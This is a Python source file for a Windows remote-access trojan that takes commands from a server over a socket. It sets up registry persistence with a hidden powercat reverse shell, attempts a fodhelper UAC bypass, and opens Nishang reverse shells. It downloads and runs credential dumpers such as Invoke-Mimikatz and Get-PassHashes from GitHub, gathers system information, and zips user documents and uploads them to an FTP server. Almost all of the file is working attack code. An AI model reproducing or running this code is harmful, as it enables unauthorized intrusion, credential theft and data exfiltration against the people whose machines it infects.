import socket
import sys
import time
import winreg
import requests
import base64
import subprocess
import os
from pathlib import Path
import shutil
import ftplib

import time
import ftplib
import os
import shutil
import sys

args = sys.argv

# Parameters: IP, UserName, Password #


def exfiltrator(IP, User, Pass):

    all_files = list()
    errors = list()
    copied = list()

    # drives = ["C:\\", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:"]
    drives = ["C:\\users"]

    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if len(root) == 0:
                pass
            else:
                for i in files:
                    if i.endswith(".pdf") or i.endswith(".xlsx") or i.endswith(".doc") or i.endswith(".docx") or i.endswith(".txt"):
                        absp = os.path.join(root, i)
                        all_files.append(absp.replace(":", ":\\"))

    # print([i for i in all_files])

    cwd = os.getcwd()
    exfiltrate = str(cwd) + "\\exfiltrate\\"
    try:
        if os.mkdir("exfiltrate"):
            # print()
            print("Successfully created the exfiltration directory!")
            # print()
    except FileExistsError:
        # print()
        print("Folder Already Exists!")
        # print()
        pass


    loader = 0
    for files in all_files:
        loader += 1
        try:
            time.sleep(0.01)
            try:
                shutil.copy(files, exfiltrate)
                copied.append(files)
                # print("Copied File ->", files)
            except:
                pass
        except PermissionError or shutil.Error or shutil.SameFileError as reason:
            # print("Error copying file -> ", files)
            # print(reason)
            errors.append(files)
            pass

    print("-")
    print("Total Files: ", len(all_files))
    print("Successfully Copied: ", len(copied))
    print("Copy Error: ", len(errors))
    print("-")

    try:
        print("Archiving Folder for Exfiltration")
        shutil.make_archive("exfiltrated", 'zip', exfiltrate)
        print()
    except:
        print()

        print("Failed to process Archive")
        print()
    # global ftp
    try:
        ftp = ftplib.FTP(IP)
        ftp.login(user=User, passwd=Pass)
        print()
        print("Logged In to FTP Server!")
    except:
        print()
        print("Error Logging in to FTP Server")
        print()
        time.sleep(5)
        ftp = None
        # sys.exit()

    if ftp is not None:
        try:
            print()
            print("Initiating Exfiltration!!!")
            file = open(cwd+"\\exfiltrated.zip", 'rb')
            ftp.storbinary(f"STOR exfiltrated.zip", file)
            print()
            return "Exfiltration Complete"
            # sys.exit()
        except ftplib.all_errors as e:
            print()
            print("Error Transferring File! ")
            print()
            return "Exfiltration Failed"
            # sys.exit()

    else:
        # sys.exit()
        print("FTP transfer Error")
        return "Exfiltration Failed"


debug = True


try:
    HOST = sys.argv[1]
except:
    HOST = None
    print("Syntax: File xxx.xxx.xxx.xxx yyyy")
    sys.exit()

try:
    PORT = int(sys.argv[2])
except:
    PORT = None
    print("Syntax: File xxx.xxx.xxx.xxx yyyy")
    sys.exit()


def shell(cmd):
    process = subprocess.Popen(full_cmd, stdout=subprocess.PIPE)
    sres = process.communicate()[0].decode()
    if debug is True: print(sres)
    return sres


def persist(LHOST, LPORT):

    rev_powercat = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); " \
                    "powercat -c " + LHOST + " -p " + LPORT + " -ep"

    reg_path = winreg.HKEY_CURRENT_USER
    try:
        key = winreg.OpenKeyEx(reg_path, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        val = "powershell -ep bypass -windowstyle hidden -command " + rev_powercat
        winreg.SetValueEx(key, 'Persist', 0, winreg.REG_SZ, val)
        key.Close()
        return True
    except winreg.error as e:
        return e


def escalate(LHOST, LPORT):
    file_name = Path(__file__).name
    file_path = Path(__file__).parent.absolute()
    full_path = str(file_path) + "\\" + str(file_name)
    program = r'powershell -ep bypass -windowstyle hidden -command "' + full_path + ' ' + LHOST + ' ' + LPORT + '"'.replace("\\", "\\\\")
    # program = "cmd start /c \"" + full_path + "\""

    reg_path = winreg.HKEY_CURRENT_USER
    try:
        Ckey = winreg.CreateKey(reg_path, r"Software\\Classes\\ms-settings\\Shell\\Open\\command")
    except winreg.error as e:
        return e

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, winreg.KEY_SET_VALUE)
        val = program
        winreg.SetValueEx(Okey, None, 0, winreg.REG_SZ, val)
    except winreg.error as e:
        return e

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(Okey, "DelegateExecute", 0, winreg.REG_SZ, "")
    except winreg.error as e:
        return e


def nishang_shell(LHOST, LPORT):
    rev_nishang = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');" \
                  " Invoke-PowerShellTcp -Reverse -IPAddress " + LHOST + " -Port " + LPORT

    full_cmd = "Powershell -ep bypass -Command " + rev_nishang
    subprocess.run(full_cmd)


def getCreds():
    creds_nishang = "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');" \
                    " Get-PassHashes"
    full_cmd = "Powershell -ep bypass -Command " + creds_nishang
    process = subprocess.Popen(full_cmd, stdout=subprocess.PIPE)
    creds_res = process.communicate()[0].decode()
    if debug is True: print(creds_res)
    return creds_res


def mimikatzlogon():
    mimi_ps1 = "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');" \
               " Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'"
    full_cmd = "Powershell -ep bypass -Command " + mimi_ps1
    process = subprocess.Popen(full_cmd, stdout=subprocess.PIPE)
    creds_res = process.communicate()[0].decode()
    if debug is True: print(creds_res)
    return creds_res


def information():
    info_ps1 = "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1');" \
               " Get-Information"
    full_cmd = "Powershell -ep bypass -Command " + info_ps1
    process = subprocess.Popen(full_cmd, stdout=subprocess.PIPE)
    creds_res = process.communicate()[0].decode()
    if debug is True: print(creds_res)
    return creds_res

def information2():
    info2_ps1 = "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/JuanMirandaBlitz/Gathering/master/Gathering.ps1');" \
               " Gathering -Privileged no"
    full_cmd = "Powershell -ep bypass -Command " + info2_ps1
    process = subprocess.Popen(full_cmd, stdout=subprocess.PIPE)
    creds_res = process.communicate()[0].decode()
    if debug is True: print(creds_res)
    return creds_res


def download(file_name):
    file = open(file_name, 'rb')
    content = file.read
    return content


s = socket.socket()
s.connect((HOST, int(PORT)))
# rec = s.recv(9096).decode()

while True:
    rec = s.recv(9096).decode()
    if debug is True: print(rec)

    if "persist" in rec:
        try:
            LHOST = str(rec.split(",")[1]).strip(" ")
            LPORT = str(rec.split(",")[2]).strip(" ")
        except:
            LHOST = None
            LPORT = None
        s.send(str("LHOST = " + str(LHOST) + " LPORT = " + str(LPORT) + " --- Persistence command sent").encode())
        if LHOST and LPORT is not None:
            res = persist(LHOST, LPORT)
            if res is True:
                s.send("Persistence achieved".encode())
            else:
                s.send(str(res).encode())
        else:
            s.send("# Syntax Error # | Syntax: rev-sh, LHOST, LPORT".encode())

    if "escalate" in rec:
        try:
            LHOST = str(rec.split(",")[1]).strip(" ")
            LPORT = str(rec.split(",")[2]).strip(" ")
        except:
            LHOST = None
            LPORT = None
        s.send(str("LHOST = " + str(LHOST) + " LPORT = " + str(LPORT) + " --- Escalation commands sent").encode())

        if LHOST and LPORT is not None:
            esc = escalate(LHOST, LPORT)
            if esc is None:
                os.popen("fodhelper")
                s.send("# Escalation Attempted. Second Server Started with mentioned port number #".encode())
            else:
                s.send("# Escalation Attempt Unsuccessful".encode())
        else:
            s.send("# Syntax Error # | Syntax: rev-sh, LHOST, LPORT".encode())

    if "shell" in rec:
        try:
            scommand = rec.split(",")[1]
        except:
            scommand = None

        if scommand is not None:
            full_cmd = 'cmd /C "' + scommand + '"'
            sres = shell(full_cmd)
            s.send(sres.encode())
        else:
            s.send("# Syntax Error # | Syntax: shell, command".encode())

    if "rev-sh" in rec:
        try:
            LHOST = str(rec.split(",")[1]).strip(" ")
            LPORT = str(rec.split(",")[2]).strip(" ")
        except:
            LHOST = None
            LPORT = None

        if LHOST and LPORT is not None:
            nishang_shell(LHOST, LPORT)
        else:
            s.send("# Syntax Error # | Syntax: rev-sh, LHOST, LPORT".encode())

    if "get-creds" in rec:
        creds = getCreds()
        s.send(creds.encode())

    if "mimikatz" in rec:
        mimipass = mimikatzlogon()
        s.send(mimipass.encode())

    if "get-info" in rec:
        info = information()
        s.send(info.encode())

    if "get2-info" in rec:
        info = information2()
        s.send(info.encode())

    if "exfiltrate" in rec:
        try:
            LHOST = str(rec.split(",")[1]).strip(" ")
            USER = str(rec.split(",")[2]).strip(" ")
            PASS = str(rec.split(",")[3]).strip(" ")
        except:
            LHOST = None
            USER = None
            PASS = None

        if LHOST or USER or PASS is not None:
            exfiltrate = exfiltrator(LHOST, USER, PASS)
            s.send(exfiltrate.encode())
        else:
            s.send("# Syntax Error # | Syntax: exfiltrate LHOST user password".encode())


    if rec == "quit":
        s.close()
        sys.exit()

    # else:
        # s.send(rec.encode())
